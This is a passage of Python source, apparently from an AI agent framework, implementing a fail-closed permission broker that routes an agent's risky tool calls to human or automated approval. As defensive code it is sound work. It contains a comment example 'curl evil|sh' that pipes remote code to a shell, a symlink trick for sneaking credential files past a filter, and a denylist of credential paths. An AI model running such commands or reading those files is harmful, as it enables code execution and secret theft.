"""Process-wide tool-call permission broker (opencode-style approval gate).

Every ``HostDispatcher.__call__`` for a risk-bearing tool consults the singleton
``broker()`` via :meth:`PermissionBroker.gate`. The gate resolves the call
against the persisted rules (see :meth:`Store.resolve_permission`) and:

* ``allow`` → returns immediately;
* ``deny``  → returns a soft-fail the model can recover from;
* ``ask``   → persists a concrete approval request, emits an
  ``await_permission`` event when a UI channel exists, and BLOCKS the daemon
  turn until the user answers, the turn is cancelled, or the request expires.
  Headless/unattended execution fails closed by default; an operator must set
  ``OPENAI4S_UNATTENDED_APPROVAL=allow`` to opt into fail-open behaviour.

The broker is keyed by ``root_frame_id`` so the SAME dispatcher (foreground +
background cells) and any nested/delegated dispatcher all gate uniformly and
their prompts surface in the one conversation the user is watching — without the
delegation subsystem needing to know anything about the gate.
"""

from __future__ import annotations

import hashlib
import os
import re
import threading
import time
import uuid
from typing import Any, Callable

_SCOPES = ("once", "conversation", "project", "global")


def _scope(value: str | None) -> str:
    return value if value in _SCOPES else "once"


#: Path segments and basenames that carry credentials without matching the
#: host tool's basename denylist. `is_secret_path` tests the BASENAME only, so
#: `~/.aws/credentials`, `~/.ssh/known_hosts` and `~/.config/gh/hosts.yml` all
#: pass it. That is tolerable when a human is looking at the approval card and
#: can see the path; it is not tolerable for an approval no human will ever
#: see. Guardian therefore applies its own wider fence rather than inheriting
#: a denylist written for the interactive case.
_CREDENTIAL_DIRS = frozenset(
    {".aws", ".ssh", ".gnupg", ".docker", ".kube", ".azure", ".config/gcloud"}
)
#: Basenames distinctive enough to deny wherever they appear. Deliberately does
#: NOT include generic project filenames: `config.json`, `token.json` and
#: `credentials.json` are ordinary in a source tree, and denying them made a
#: normal read look like a policy violation -- three of which opened the denial
#: circuit and bricked the conversation. Generic names are covered by
#: :data:`_CREDENTIAL_DIRS` instead, where the directory supplies the meaning.
_CREDENTIAL_BASENAMES = frozenset(
    {
        "credentials",
        "authorized_keys",
        "known_hosts",
        "access-token",
        "service-account.json",
        ".npmrc",
        ".pypirc",
        ".git-credentials",
        ".netrc",
        ".pgpass",
    }
)


def _credential_shaped_candidates(path: str) -> list[str]:
    """The spellings of one path that the fence must all consider.

    A name-based fence that only sees the string it was handed is defeated by
    `ln -s ~/.aws/credentials /tmp/innocent.txt`: the link name is innocent and
    the target is not. `realpath` is what closes that, and it is also what
    collapses `..` traversal. It can raise (a path too long, a symlink loop) and
    the target need not exist, so the literal spelling is always checked too --
    resolution is an addition to the check, never a replacement for it.
    """

    candidates = [path]
    # ONLY for an absolute path. `realpath` anchors a relative one to the
    # daemon's cwd, but every workspace file tool resolves the same string
    # against `<data_dir>/agent-workspaces/<frame>` -- so resolving here would
    # answer a question about a different file than the one the tool opens, and
    # a fence that evaluates the wrong path is worse than one that admits it
    # cannot resolve. The literal spelling is checked either way.
    if os.path.isabs(path):
        try:
            candidates.append(os.path.realpath(path))
        except (OSError, ValueError):  # symlink loop, ENAMETOOLONG, NUL
            pass
    return candidates


def _credential_shaped_path(path: str) -> bool:
    """Whether a path is credential-bearing by directory or by basename."""

    if not path:
        return False
    for candidate in _credential_shaped_candidates(path):
        normalized = (candidate or "").replace("\\", "/").rstrip("/").lower()
        if not normalized:
            continue
        parts = [segment for segment in normalized.split("/") if segment]
        if not parts:
            continue
        if parts[-1] in _CREDENTIAL_BASENAMES:
            return True
        if set(parts[:-1]) & {name for name in _CREDENTIAL_DIRS if "/" not in name}:
            return True
        if any(pair in normalized for pair in _CREDENTIAL_DIRS if "/" in pair):
            return True
    return False


def _daemon_config():
    """The process config, for the Guardian's feature flags and budgets."""

    from openai4s.config import get_config

    return get_config()


def _recomputed_action_digest(request) -> str | None:
    """Re-derive the request row's canonical action digest, or None.

    Deliberately the Store's own canonicalization rather than a second one:
    the digest Guardian binds to has to be the digest
    ``resolve_permission_request`` will CAS against, or the approval is bound
    to something the store never agreed to. None on any failure -- an envelope
    we cannot re-derive is one we cannot vouch for.
    """

    try:
        from openai4s.storage.permissions import canonical_permission_action_digest

        return canonical_permission_action_digest(request)
    except Exception:  # noqa: BLE001 — unverifiable is not approvable
        return None


def _guardian_hard_deny(
    store,
    *,
    root_frame_id: str | None,
    project_id: str,
    tool: str,
    target: str,
) -> bool:
    """Whether an existing hard policy already refuses this exact action.

    The Guardian is the LAST line, not the first: sandbox, egress, secret and
    standing-deny decisions outrank it, and an allow it issues over the top of
    one of them would be the model widening its own authority. Anything we
    cannot evaluate counts as a deny, because "we could not check" is not
    evidence that the action is safe.
    """

    try:
        from openai4s.host.files import is_secret_path

        if target and is_secret_path(target):
            return True
    except Exception:  # noqa: BLE001 — an unusable check denies
        return True
    if target and _credential_shaped_path(target):
        return True
    if "://" in target:
        # Guarded on a scheme because `egress.domain_of` reads ANY bare string
        # as a hostname: `domain_of("notes.txt")` is `"notes.txt"`. Without this,
        # every relative file read was refused as "denied by an existing hard
        # policy" whenever OPENAI4S_EGRESS=allowlist -- a false denial that also
        # wrote a durable audit row naming a policy that never issued.
        try:
            from openai4s.egress import domain_allowed

            if not domain_allowed(target):
                return True
        except Exception:  # noqa: BLE001
            return True
    try:
        if (
            store.resolve_permission(
                root_frame_id=root_frame_id,
                project_id=project_id,
                tool=tool,
                pattern_input=target,
            )
            == "deny"
        ):
            return True
    except Exception:  # noqa: BLE001
        return True
    return False


def _restart_resolution_marker(store, request: dict, *, allow: bool) -> bool:
    """Append an idempotent, argument-free restart decision to the ledger.

    Permission payloads may be redacted or incomplete and are never replayable
    execution input.  This marker only teaches the next model turn the one fact
    it may rely on: the old action did not execute and must be reconsidered.
    """

    decision_id = str(request.get("decision_id") or "")
    root = str(request.get("root_frame_id") or "")
    tool = re.sub(r"[^A-Za-z0-9_.:-]+", "_", str(request.get("tool") or "unknown"))[
        :120
    ]
    if not decision_id or not root:
        return False
    suffix = hashlib.sha256(decision_id.encode("utf-8")).hexdigest()[:16]
    group_id = f"ag-permission-{suffix}"
    event_id = f"ae-permission-{suffix}"
    if allow:
        content = (
            f"[system] A human approved the previously interrupted {tool} "
            "request after the daemon restarted. The original operation did "
            "not execute. Re-evaluate current state and issue a fresh action "
            "only if it is still needed; never assume the old action succeeded."
        )
        result = {
            "status": "requires_continue",
            "allow": True,
            "requires_continue": True,
            "original_action_executed": False,
            "tool": tool,
        }
    else:
        content = (
            f"[system] A human denied the previously interrupted {tool} "
            "request after the daemon restarted. The original operation did "
            "not execute. Do not assume it succeeded."
        )
        result = {
            "status": "denied",
            "allow": False,
            "requires_continue": False,
            "original_action_executed": False,
            "tool": tool,
        }
    try:
        group = store.get_action_group(group_id)
        if group is None:
            try:
                store.append_action_group(
                    root_frame_id=root,
                    turn_id=f"permission-{suffix}",
                    kind="permission_resolution",
                    group_id=group_id,
                    assistant_content=content,
                    assistant_message={"role": "system", "content": content},
                )
            except Exception:  # noqa: BLE001 - retry an idempotent race below
                if store.get_action_group(group_id) is None:
                    raise
            group = store.get_action_group(group_id)
        events = list((group or {}).get("events") or ())
        if not any(event.get("event_id") == event_id for event in events):
            try:
                store.append_action_event(
                    group_id=group_id,
                    event_id=event_id,
                    type="completed" if allow else "denied",
                    result=result,
                    side_effect_class="runtime_mutation",
                    resource_keys=[f"permission:{tool}"],
                )
            except Exception:  # noqa: BLE001 - accept only a completed race
                group = store.get_action_group(group_id)
                if not any(
                    event.get("event_id") == event_id
                    for event in (group or {}).get("events") or ()
                ):
                    raise
        return True
    except Exception:  # noqa: BLE001 - caller keeps continuation disabled
        return False


def suggest_patterns(method: str, target: str) -> list[str]:
    """Offer a few generalizations of a tool target for the 'remember' picker,
    most-specific first (opencode's biggest UX win over storing exact strings)."""
    target = (target or "").strip()
    out: list[str] = []
    if target:
        out.append(target)
    if method == "bash" and target:
        # A '*' in a bash rule spans shell metacharacters, so a broad prefix rule
        # like 'git *' would also authorize 'git x && curl evil|sh'. Only offer
        # prefix generalizations for a SINGLE simple command (no ; && || | ` $()
        # redirects); for a compound command offer just the exact string.
        if not re.search(r"[;&|`]|\$\(|>|<", target):
            toks = target.split()
            if len(toks) >= 2:
                out.append(f"{toks[0]} {toks[1]} *")
            if toks:
                out.append(f"{toks[0]} *")
    elif method in ("write_file", "edit_file", "read_file", "save_artifact") and target:
        # dir/* and *.ext generalizations
        if "/" in target:
            out.append(target.rsplit("/", 1)[0] + "/*")
        if "." in target.rsplit("/", 1)[-1]:
            out.append("*." + target.rsplit(".", 1)[-1])
    elif method == "web_fetch" and target:
        out.append(target)  # already a domain
    elif (
        method in ("mcp_call", "mcp_resource_read", "mcp_prompt_get") and "/" in target
    ):
        out.append(target.split("/", 1)[0] + "/*")
    out.append("*")
    # de-dupe preserving order
    seen: set[str] = set()
    uniq: list[str] = []
    for p in out:
        if p and p not in seen:
            seen.add(p)
            uniq.append(p)
    return uniq


class _Pending:
    __slots__ = (
        "event",
        "allow",
        "scope",
        "pattern",
        "message",
        "payload",
        "created_at",
        "store",
        "expected_action_digest",
        "resolution_done",
        "resolution_result",
    )

    def __init__(
        self,
        payload: dict,
        store=None,
        *,
        expected_action_digest: str | None = None,
    ):
        self.event = threading.Event()
        self.allow = False
        self.scope = "once"
        self.pattern: str | None = None
        self.message: str | None = None
        self.payload = payload
        self.created_at = time.time()
        self.store = store
        self.expected_action_digest = expected_action_digest
        self.resolution_done = threading.Event()
        self.resolution_result: dict | None = None


class PermissionBroker:
    DEFAULT_TIMEOUT = (
        900.0  # 15 min — backstop so a never-answered prompt frees the turn
    )
    _POLL = 0.5
    #: How long the HTTP decision thread waits for the tool thread's durable
    #: acknowledgement before answering "still committing". Generous enough to
    #: cover a slow SQLite writer holding the Store lock, short enough that a
    #: lost tool thread cannot retire a server thread permanently.
    RESOLVE_ACK_TIMEOUT = 30.0

    def __init__(self) -> None:
        #: How the broker learns which approvals reviewer a conversation
        #: actually selected. This is a PORT, not an import: the durable
        #: selection is Web-session state owned by ``openai4s/server/``, while
        #: the broker is core infrastructure the CLI shares. Reaching into the
        #: server package from here would invert the dependency, and
        #: ``tests/test_config.py`` asserts that boundary. The server registers
        #: its adapter at startup; the CLI, which has no such state, leaves it
        #: unset and the operator's environment decides -- the only thing there
        #: is to decide from in a one-shot run.
        self._selection_resolver: Callable[[Any, str, str], str] | None = None
        self._lock = threading.RLock()
        self._channels: dict[str, dict] = {}  # root_frame_id -> {emit, cancel}
        self._pending: dict[str, _Pending] = {}  # decision_id -> _Pending
        self._by_root: dict[str, set[str]] = {}  # root_frame_id -> {decision_id}

    # --- UI channel registration (called by the web gateway) --------------
    def register_channel(
        self,
        root_frame_id: str,
        emit: Callable[[dict], Any],
        cancel_event: threading.Event | None = None,
        watching: Callable[[], bool] | None = None,
        store=None,
    ) -> None:
        # `watching` is UI metadata only. Approval correctness never depends on
        # a subscriber being present: unwatched requests remain durably pending.
        with self._lock:
            self._channels[root_frame_id] = {
                "emit": emit,
                "cancel": cancel_event,
                "watching": watching,
                "store": store,
            }

    def unregister_channel(self, root_frame_id: str) -> None:
        with self._lock:
            self._channels.pop(root_frame_id, None)

    def pending_events(self, root_frame_id: str, *, store=None) -> list[dict]:
        """Outstanding await_permission payloads for a conversation (for a
        client reconnecting mid-pause)."""
        with self._lock:
            memory = [
                self._pending[d].payload
                for d in self._by_root.get(root_frame_id, ())
                if d in self._pending
            ]
            channel = self._channels.get(root_frame_id) or {}
            store = store or channel.get("store")
        if store is None:
            return memory
        seen = {item.get("decision_id") for item in memory}
        try:
            durable = [
                row.get("payload") or {}
                for row in store.list_permission_requests(
                    root_frame_id=root_frame_id,
                    state="pending",
                )
                if row.get("decision_id") not in seen
            ]
        except Exception:  # noqa: BLE001 — reconnect must remain available
            durable = []
        return memory + durable

    def is_pending(self, root_frame_id: str) -> bool:
        """Whether a tool call is currently blocked awaiting approval for this
        conversation. The cell watchdog uses this to freeze its clock so a slow
        human approval is not mistaken for a wedged cell."""
        with self._lock:
            return bool(self._by_root.get(root_frame_id))

    def set_approvals_reviewer_resolver(
        self, resolver: Callable[[Any, str, str], str] | None
    ) -> None:
        """Register how to resolve a conversation's ``approvals_reviewer``.

        The resolver takes ``(store, root_frame_id, project_id)`` and returns
        the effective selection, honouring import quarantine and the legacy
        ``review:auto:*`` migration.
        """

        with self._lock:
            self._selection_resolver = resolver

    def _approvals_reviewer(
        self, store, root_frame_id: str | None, project_id: str
    ) -> str:
        """The conversation's effective approvals reviewer, or "" if unknown.

        A registered resolver that RAISES resolves to ``"user"`` -- the
        fail-closed answer -- because "we could not tell" is not consent. No
        resolver at all is a different statement: nothing in this process owns
        a durable selection, so the operator's environment is the only
        expressed intent there is.
        """

        with self._lock:
            resolver = self._selection_resolver
        if resolver is None:
            return ""
        try:
            return str(resolver(store, str(root_frame_id or ""), project_id) or "")
        except Exception:  # noqa: BLE001 — an unreadable selection is not consent
            return "user"

    def _resolve_guardian_decision(
        self,
        store,
        *,
        decision_id: str,
        root: str | None,
        chan: dict | None,
        created_request: dict,
        decision: tuple[bool, str],
    ) -> dict:
        """Commit one Guardian verdict and tell the UI, if anyone is watching.

        The durable resolution is the decision; the event is only how a browser
        finds out. A CAS failure here downgrades to deny, because an approval
        the store would not commit is not an approval.
        """

        allowed, message = decision
        state = "allowed" if allowed else "denied"
        try:
            resolved = store.resolve_permission_request(
                decision_id,
                state=state,
                scope="once",
                message=message,
                resolution_context="guardian",
                expected_action_digest=(
                    created_request.get("action_digest") if allowed else None
                ),
            )
            allowed = bool(allowed and resolved.get("state") == "allowed")
            actual_state = str(resolved.get("state") or state)
            if state == "allowed" and not allowed:
                message = "approval expired before it could be committed"
        except Exception:  # noqa: BLE001 — an uncommittable approval is a denial
            allowed = False
            actual_state = "failed"
            message = "approval persistence failed closed"
        if chan is not None:
            # Same event the human path emits, so an open browser sees the card
            # resolve instead of waiting on an answer that already happened.
            try:
                chan["emit"](
                    {
                        "type": "permission_resolved",
                        "frame_id": root,
                        "decision_id": decision_id,
                        "allow": allowed,
                        "scope": "once",
                        "state": actual_state,
                        "resolution_actor": "guardian",
                    }
                )
            except Exception:  # noqa: BLE001 — delivery is not the decision
                pass
        return {
            "allow": allowed,
            "decision_id": decision_id,
            **({} if allowed else {"message": message}),
        }

    # --- the gate (called by HostDispatcher, on the turn thread) ----------
    def gate(
        self,
        *,
        store,
        frame_id: str | None,
        method: str,
        target: str = "",
        view: tuple | None = None,
        project_id: str | None = None,
        action_group_id: str | None = None,
        action_id: str | None = None,
        tool_call_id: str | None = None,
        side_effect_class: str | None = None,
        resource_keys: list[str] | tuple[str, ...] | None = None,
        dangerous: bool = False,
        canonical_arguments: Any = None,
        timeout: float | None = None,
    ) -> dict:
        # Resolve the conversation identity + project from the dispatcher's frame
        # (works for root, background and delegated child dispatchers alike).
        root = frame_id
        proj = project_id
        try:
            if frame_id:
                fr = store.get_frame(frame_id)
                if fr:
                    root = fr.get("root_frame_id") or frame_id
                    proj = proj or fr.get("project_id") or "default"
                # A delegated sub-agent's child frame carries project_id='default';
                # resolve the project from the ROOT conversation frame so project-
                # scoped rules (and the ROOT's UI channel) apply to sub-agents too.
                if root and root != frame_id:
                    rfr = store.get_frame(root)
                    if rfr and rfr.get("project_id"):
                        proj = rfr.get("project_id")
        except Exception:  # noqa: BLE001 — never let resolution break a tool call
            pass
        try:
            decision = store.resolve_permission(
                root_frame_id=root,
                project_id=proj or "default",
                tool=method,
                pattern_input=target,
            )
        except Exception:  # noqa: BLE001
            decision = "ask"
        if decision == "allow":
            return {"allow": True}
        if decision == "deny":
            return {
                "allow": False,
                "message": "blocked by a standing 'deny' permission rule",
            }
        restart_once_grant = None
        try:
            if root:
                restart_once_grant = store.consume_restart_permission_grant(
                    root_frame_id=root,
                    project_id=proj or "default",
                    tool=method,
                    target=target,
                    side_effect_class=side_effect_class,
                    resource_keys=resource_keys,
                    dangerous=dangerous,
                    canonical_arguments=canonical_arguments,
                )
        except Exception:  # noqa: BLE001 - an unusable grant never fails open
            restart_once_grant = None
        if restart_once_grant is not None:
            return {
                "allow": True,
                "continuation_decision_id": restart_once_grant.get("decision_id"),
            }

        # decision == "ask": allocate the durable identity before deciding how
        # the caller will wait, so even a headless denial is auditable.
        did = "perm-" + uuid.uuid4().hex[:12]
        kind = view[0] if view else method
        title = view[1] if view else method
        inp = view[2] if (view and len(view) > 2) else {}
        payload = {
            "type": "await_permission",
            "frame_id": root,
            "decision_id": did,
            "tool": method,
            "kind": kind,
            "title": title,
            "input": inp,
            "target": target,
            "suggested_patterns": suggest_patterns(method, target),
            "scopes": list(_SCOPES),
            "sub_agent": bool(frame_id and root and frame_id != root),
            "action_group_id": action_group_id,
            "action_id": action_id,
            "tool_call_id": tool_call_id,
            "side_effect_class": side_effect_class,
            "resource_keys": list(resource_keys or ()),
            # The tool's own risk declaration, so the card can ask for a
            # dangerous capability differently than for a file read. Carried in
            # the payload rather than a new column: the payload is stored with
            # the request, so the durable record and any replay of it keep the
            # fact without a migration.
            "dangerous": bool(dangerous),
        }
        wait_seconds = timeout if timeout is not None else self.DEFAULT_TIMEOUT
        try:
            created_request = store.create_permission_request(
                decision_id=did,
                root_frame_id=root,
                frame_id=frame_id,
                project_id=proj or "default",
                action_group_id=action_group_id,
                action_id=action_id,
                tool_call_id=tool_call_id,
                side_effect_class=side_effect_class,
                resource_keys=resource_keys,
                tool=method,
                target=target,
                payload=payload,
                dangerous=dangerous,
                canonical_arguments=canonical_arguments,
                expires_at=int((time.time() + wait_seconds) * 1000),
            )
        except Exception:  # noqa: BLE001 — inability to audit must fail closed
            return {
                "allow": False,
                "message": "approval required but its durable request could not be recorded",
            }
        try:
            from openai4s.server.guardian_shadow import maybe_record_shadow

            maybe_record_shadow(store, created_request, payload)
        except Exception:  # noqa: BLE001 - shadow must not block the ask
            pass

        with self._lock:
            chan = self._channels.get(root)
            if chan is not None and chan.get("store") is None:
                chan["store"] = store

        # Guardian is consulted BEFORE the channel is considered. A session that
        # selected `approvals_reviewer=auto_review` asked not to wait for a
        # human, and a browser being open does not withdraw that: gating the
        # consult on `chan is None` meant Web Auto Mode still parked on an
        # approval card, so the mode did nothing in the surface where it is
        # actually configured. `approvals_reviewer=user` is the human-card path,
        # and it stays exactly that -- `decide_unattended` returns a denial for
        # a recorded `user` and None when nobody recorded anything.
        guardian_decision = None
        try:
            from openai4s.server.guardian_enforce import decide_unattended

            # The Guardian is asked about the DURABLE action, not the UI
            # projection: `action_digest` is what `resolve_permission_request`
            # will CAS against below, so binding the approval to anything
            # else would grant permission for an action the store cannot
            # confirm. `canonical_arguments` likewise comes from the row,
            # not from `payload["input"]`, which is truncated and redacted.
            guardian_decision = decide_unattended(
                {
                    **payload,
                    "canonical_arguments": canonical_arguments,
                },
                config=_daemon_config(),
                approvals_reviewer=self._approvals_reviewer(
                    store, root, proj or "default"
                ),
                expected_digest=created_request.get("action_digest"),
                # The SAME envelope the Store hashes, hashed again from the
                # row's own fields. Guardian compares the two: one identity
                # for the action, not a second one that could never agree
                # with the durable record it claims to bind.
                recomputed_digest=_recomputed_action_digest(created_request),
                hard_deny=_guardian_hard_deny(
                    store,
                    root_frame_id=root,
                    project_id=proj or "default",
                    tool=method,
                    target=target,
                ),
                audit_persisted=bool(created_request.get("decision_id")),
                circuit_key=str(root or did),
                # Only the broker knows whether anyone is actually there to ask.
                interactive=chan is not None,
            )
        except Exception:  # noqa: BLE001 - fall back to fail-closed deny
            guardian_decision = None

        if guardian_decision is not None:
            return self._resolve_guardian_decision(
                store,
                decision_id=did,
                root=root,
                chan=chan,
                created_request=created_request,
                decision=guardian_decision,
            )

        if chan is None:
            unattended = (
                os.environ.get("OPENAI4S_UNATTENDED_APPROVAL", "deny").strip().lower()
            )
            allowed = unattended == "allow"
            message = (
                "allowed by explicit unattended approval policy"
                if allowed
                else "approval required but no interactive channel is attached"
            )
            state = "allowed" if allowed else "denied"
            try:
                resolved_request = store.resolve_permission_request(
                    did,
                    state=state,
                    scope="once",
                    message=message,
                    resolution_context="unattended",
                    expected_action_digest=(
                        created_request.get("action_digest") if allowed else None
                    ),
                )
                allowed = bool(allowed and resolved_request.get("state") == "allowed")
                if state == "allowed" and not allowed:
                    message = "approval expired before it could be committed"
            except Exception:  # noqa: BLE001
                allowed = False
                message = "approval persistence failed closed"
            return {
                "allow": allowed,
                "decision_id": did,
                **({} if allowed else {"message": message}),
            }

        cancel_ev = chan.get("cancel")
        if cancel_ev is not None and cancel_ev.is_set():
            try:
                store.resolve_permission_request(
                    did,
                    state="cancelled",
                    scope="once",
                    message="turn cancelled",
                    resolution_context="live_thread",
                )
            except Exception:  # noqa: BLE001
                pass
            return {"allow": False, "message": "turn cancelled"}

        pend = _Pending(
            payload,
            store=store,
            expected_action_digest=created_request.get("action_digest"),
        )
        with self._lock:
            self._pending[did] = pend
            self._by_root.setdefault(root, set()).add(did)
        try:
            chan["emit"](payload)
        except Exception:  # noqa: BLE001
            pass

        deadline = time.time() + wait_seconds
        effective_allow = False
        actual_state = ""
        resolution_error: str | None = None
        # Everything from here to the resolved-event emit runs under a
        # `finally`. The three invariants it guarantees -- the pending entry
        # is removed, the HTTP waiter is released, and the decision is
        # published -- were previously straight-line code, so any abnormal
        # exit (daemon shutdown KeyboardInterrupt, a raise in the durable
        # write) leaked `_by_root`. That leak pins `is_pending()` True
        # forever, which freezes the cell watchdog's clock and makes a truly
        # wedged cell unreapable, and parks the HTTP decision thread on a
        # `resolution_done` nobody will ever set.
        try:
            while not pend.event.wait(self._POLL):
                if cancel_ev is not None and cancel_ev.is_set():
                    pend.allow, pend.message = False, "turn cancelled"
                    break
                if time.time() >= deadline:
                    pend.allow, pend.message = False, "approval timed out"
                    break

            requested_allow = bool(pend.allow)
            durable_state = (
                "allowed"
                if requested_allow
                else (
                    "cancelled"
                    if pend.message == "turn cancelled"
                    else (
                        "timed_out"
                        if pend.message == "approval timed out"
                        else "denied"
                    )
                )
            )
            resolved_request = None
            resolution_error: str | None = None
            try:
                resolved_request = store.resolve_permission_request(
                    did,
                    state=durable_state,
                    scope=pend.scope,
                    pattern=pend.pattern,
                    message=pend.message,
                    resolution_context="live_thread",
                    expected_action_digest=(
                        pend.expected_action_digest if requested_allow else None
                    ),
                )
            except Exception:  # noqa: BLE001 — persistence failure must fail closed
                resolution_error = "approval resolution could not be durably recorded"
            actual_state = str((resolved_request or {}).get("state") or "")
            effective_allow = bool(requested_allow and actual_state == "allowed")
            if requested_allow and actual_state == "timed_out":
                resolution_error = "approval request expired"
            elif requested_allow and not effective_allow and resolution_error is None:
                resolution_error = "approval failed exact-action integrity validation"
            # Persist a standing rule only after the concrete request's terminal
            # state is durable; otherwise a failed audit write could still leave a
            # broad allow rule behind.
            if (
                pend.scope
                and pend.scope != "once"
                and actual_state == durable_state
                and actual_state in {"allowed", "denied"}
            ):
                scope_id = {
                    "conversation": root,
                    "project": proj or "default",
                    "global": "",
                }.get(pend.scope, "")
                try:
                    store.set_permission_rule(
                        scope=pend.scope,
                        scope_id=scope_id,
                        tool=method,
                        pattern=(pend.pattern or target or "*"),
                        decision=("allow" if effective_allow else "deny"),
                    )
                except Exception:  # noqa: BLE001
                    pass
            live_resolution = {
                "ok": bool(
                    (effective_allow and actual_state == "allowed")
                    or (not requested_allow and actual_state == durable_state)
                ),
                "decision_id": did,
                "allow": effective_allow,
                "scope": pend.scope,
                "resolution_context": "live_thread",
                "requires_continue": False,
                "original_action_executed": None,
            }
            if not live_resolution["ok"]:
                live_resolution.update(
                    {
                        "error": resolution_error
                        or "approval resolution failed closed",
                        "code": (
                            "decision_expired"
                            if actual_state == "timed_out"
                            else "decision_integrity_failure"
                        ),
                    }
                )
            pend.resolution_result = live_resolution
            pend.resolution_done.set()
            with self._lock:
                self._pending.pop(did, None)
                pending_ids = self._by_root.get(root)
                if pending_ids:
                    pending_ids.discard(did)
                    if not pending_ids:
                        self._by_root.pop(root, None)
            try:
                chan["emit"](
                    {
                        "type": "permission_resolved",
                        "frame_id": root,
                        "decision_id": did,
                        "allow": effective_allow,
                        "scope": pend.scope,
                        "state": actual_state or "failed",
                    }
                )
            except Exception:  # noqa: BLE001
                pass
        finally:
            with self._lock:
                self._pending.pop(did, None)
                pending_ids = self._by_root.get(root)
                if pending_ids:
                    pending_ids.discard(did)
                    if not pending_ids:
                        self._by_root.pop(root, None)
            if not pend.resolution_done.is_set():
                pend.resolution_result = {
                    "ok": False,
                    "decision_id": did,
                    "allow": False,
                    "error": "approval resolution failed closed",
                    "code": "decision_integrity_failure",
                }
                pend.resolution_done.set()
        if effective_allow:
            return {"allow": True, "decision_id": did}
        return {
            "allow": False,
            "decision_id": did,
            "message": resolution_error or pend.message or "denied by user",
        }

    # --- decision + cancel (called by the web gateway / HTTP thread) ------
    def resolve(
        self,
        decision_id: str | None,
        *,
        allow: bool,
        scope: str = "once",
        pattern: str | None = None,
        message: str | None = None,
    ) -> bool:
        return bool(
            self.resolve_result(
                decision_id,
                allow=allow,
                scope=scope,
                pattern=pattern,
                message=message,
            ).get("ok")
        )

    def resolve_result(
        self,
        decision_id: str | None,
        *,
        allow: bool,
        scope: str = "once",
        pattern: str | None = None,
        message: str | None = None,
        store=None,
        root_frame_id: str | None = None,
    ) -> dict:
        """Resolve an approval and describe whether another turn is required.

        A live decision wakes the exact blocked thread.  After a daemon restart
        that thread no longer exists, so this method never replays stored tool
        arguments.  Instead it records an argument-free ledger marker and
        returns ``requires_continue``; a fresh model turn must replan the work.
        """

        if not decision_id:
            return {
                "ok": False,
                "error": "decision_id is required",
                "code": "decision_id_required",
            }
        if type(allow) is not bool:
            return {
                "ok": False,
                "error": "allow must be a Boolean",
                "code": "invalid_allow",
            }
        normalized_scope = _scope(scope)
        live_pending: _Pending | None = None
        with self._lock:
            pend = self._pending.get(decision_id)
            if pend is not None:
                pending_root = str(pend.payload.get("frame_id") or "")
                if root_frame_id and pending_root != root_frame_id:
                    return {
                        "ok": False,
                        "error": "decision does not belong to frame",
                        "code": "decision_not_found",
                    }
                if pend.event.is_set():
                    return {
                        "ok": False,
                        "error": "decision is already resolving",
                        "code": "decision_in_flight",
                    }
                pend.allow = bool(allow)
                pend.scope = normalized_scope
                pend.pattern = pattern
                pend.message = message
                pend.event.set()
                live_pending = pend
                stores = []
            else:
                # After a daemon restart there is no blocked thread, but the
                # durable request must still be resolvable and auditable.
                stores = ([store] if store is not None else []) + [
                    channel.get("store")
                    for channel in self._channels.values()
                    if channel.get("store") is not None
                ]
        if live_pending is not None:
            # The blocked tool thread publishes this acknowledgement only after
            # the durable terminal state commits, so we wait for it rather than
            # guessing. But the wait is BOUNDED: this runs on the HTTP request
            # thread, and the tool thread it depends on can be lost (daemon
            # shutdown, a raise between the wait loop and the commit) or merely
            # stuck behind a long writer holding the single Store lock. An
            # unbounded wait there parks a server thread for good.
            #
            # Timing out is not the same as failing. The approval may still be
            # committing, so the answer says exactly that and carries a code the
            # client can poll on -- never a denial the caller might act on while
            # the action goes on to execute.
            if not live_pending.resolution_done.wait(self.RESOLVE_ACK_TIMEOUT):
                return {
                    "ok": False,
                    "decision_id": decision_id,
                    "error": (
                        "the decision was accepted and is still being committed; "
                        "re-read the request to see its final state"
                    ),
                    "code": "decision_resolving",
                }
            return dict(
                live_pending.resolution_result
                or {
                    "ok": False,
                    "decision_id": decision_id,
                    "error": "permission resolution failed closed",
                    "code": "decision_integrity_failure",
                }
            )
        terminal = "allowed" if allow else "denied"
        seen_stores: set[int] = set()
        for durable_store in stores:
            if durable_store is None or id(durable_store) in seen_stores:
                continue
            seen_stores.add(id(durable_store))
            try:
                request = durable_store.get_permission_request(decision_id)
                if request is None:
                    continue
                request_root = str(request.get("root_frame_id") or "")
                if root_frame_id and request_root != root_frame_id:
                    return {
                        "ok": False,
                        "error": "decision does not belong to frame",
                        "code": "decision_not_found",
                    }
                state = str(request.get("state") or "")
                expected_action_digest = None
                if allow:
                    try:
                        expected_action_digest = (
                            durable_store.permission_request_action_digest(decision_id)
                        )
                    except ValueError:
                        # A request written before the exact-action columns
                        # existed has no digest to bind to: the migration adds
                        # `canonical_arguments_sha256` without a backfill. The
                        # store's own legacy carve-out already allows such a row
                        # to be resolved by a human; letting this raise instead
                        # meant an upgraded daemon could DENY a pre-upgrade
                        # prompt but never APPROVE one, and reported it as
                        # "unknown or expired decision".
                        expected_action_digest = None
                if state == "pending":
                    expires_at = request.get("expires_at")
                    if expires_at is not None and int(expires_at) <= int(
                        time.time() * 1000
                    ):
                        # A pending that outlived its backstop (e.g. it was
                        # created before a daemon restart) is no longer a valid
                        # approval; time it out instead of activating a fresh
                        # grant from a stale, possibly forgotten, prompt.
                        try:
                            durable_store.resolve_permission_request(
                                decision_id,
                                state="timed_out",
                                scope="once",
                                message="approval timed out",
                                resolution_context="expired",
                            )
                        except Exception:  # noqa: BLE001 - best-effort cleanup
                            pass
                        return {
                            "ok": False,
                            "error": "approval request expired",
                            "code": "decision_expired",
                        }
                    request = durable_store.resolve_permission_request(
                        decision_id,
                        state=terminal,
                        scope=normalized_scope,
                        pattern=pattern,
                        message=message,
                        resolution_context="after_restart",
                        # Activated only after the ledger marker is durable.
                        continuation_required=False,
                        expected_action_digest=expected_action_digest,
                    )
                elif not (
                    state == terminal
                    and request.get("resolution_context") == "after_restart"
                ):
                    return {
                        "ok": False,
                        "error": f"decision is already {state or 'resolved'}",
                        "code": "decision_already_resolved",
                    }
                if str(request.get("state") or "") != terminal:
                    return {
                        "ok": False,
                        "error": (
                            "approval request expired"
                            if request.get("state") == "timed_out"
                            else "approval failed exact-action integrity validation"
                        ),
                        "code": (
                            "decision_expired"
                            if request.get("state") == "timed_out"
                            else "decision_integrity_failure"
                        ),
                    }
                if _scope(request.get("scope")) != normalized_scope or (
                    request.get("pattern") or None
                ) != (pattern or None):
                    return {
                        "ok": False,
                        "error": "resolved decision scope or pattern cannot be changed",
